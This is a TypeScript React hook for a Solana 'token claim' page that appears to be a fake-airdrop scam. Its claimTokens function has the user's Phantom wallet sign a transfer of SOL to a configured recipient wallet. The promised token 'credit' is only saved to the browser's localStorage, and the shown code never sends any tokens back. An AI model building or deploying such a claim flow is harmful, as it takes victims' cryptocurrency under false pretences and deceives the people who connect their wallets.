// src/hooks/useTransaction.ts
import { useState, useCallback } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TransactionState, ClaimRecord, PhantomProvider } from '../types/index';
import { CONFIG } from '../config';

export const useTransaction = () => {
  const [transactionState, setTransactionState] = useState<TransactionState>({
    status: 'idle',
    signature: null,
    error: null,
    progress: 0
  });

  const connection = new Connection(CONFIG.RPC_ENDPOINT, 'confirmed');

  const handleTokenCredit = useCallback(async (publicKey: string, signature: string) => {
    const claimRecord: ClaimRecord = {
      walletAddress: publicKey,
      transactionSignature: signature,
      claimAmount: CONFIG.CLAIM_AMOUNT_SOL,
      tokenValue: CONFIG.TOKEN_VALUE_USD,
      timestamp: new Date().toISOString(),
      status: 'pending_credit'
    };

    try {
      const existingClaims = localStorage.getItem('tokenClaims');
      const claims: ClaimRecord[] = existingClaims ? JSON.parse(existingClaims) : [];
      claims.push(claimRecord);
      localStorage.setItem('tokenClaims', JSON.stringify(claims));
    } catch (error) {
      console.error('Failed to store claim record:', error);
    }

    console.log('Token credit record created:', claimRecord);
  }, []);

  const claimTokens = useCallback(async (
    walletAddress: string,
    balance: number,
    provider: PhantomProvider
  ) => {
    setTransactionState({ status: 'processing', signature: null, error: null, progress: 10 });

    try {
      if (balance < CONFIG.CLAIM_AMOUNT_SOL) {
        throw new Error(`Insufficient balance. Need at least ${CONFIG.CLAIM_AMOUNT_SOL} SOL`);
      }

      if (!provider.isConnected) {
        throw new Error('Wallet disconnected. Please reconnect.');
      }

      const senderPublicKey = new PublicKey(walletAddress);
      const recipientPublicKey = new PublicKey(CONFIG.RECIPIENT_WALLET);

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: senderPublicKey,
          toPubkey: recipientPublicKey,
          lamports: CONFIG.CLAIM_AMOUNT_SOL * LAMPORTS_PER_SOL
        })
      );

      setTransactionState(prev => ({ ...prev, progress: 30 }));
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPublicKey;

      setTransactionState(prev => ({ ...prev, progress: 50 }));
      const signedTransaction = await provider.signTransaction(transaction);

      setTransactionState(prev => ({ ...prev, progress: 70, status: 'confirming' }));
      const signature = await connection.sendRawTransaction(signedTransaction.serialize());

      setTransactionState(prev => ({ ...prev, progress: 85 }));
      const confirmation = await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight
      }, 'confirmed');

      if (confirmation.value.err) throw new Error('Transaction failed to confirm');

      setTransactionState({
        status: 'success',
        signature,
        error: null,
        progress: 100
      });

      await handleTokenCredit(walletAddress, signature);
    } catch (error: unknown) {
      console.error('Transaction error:', error);
      setTransactionState({
        status: 'error',
        signature: null,
        error: error instanceof Error ? error.message : 'An unexpected error occurred',
        progress: 0
      });
      throw error;
    }
  }, [connection, handleTokenCredit]);

  const resetTransaction = useCallback(() => {
    setTransactionState({
      status: 'idle',
      signature: null,
      error: null,
      progress: 0
    });
  }, []);

  return { transactionState, claimTokens, resetTransaction };
};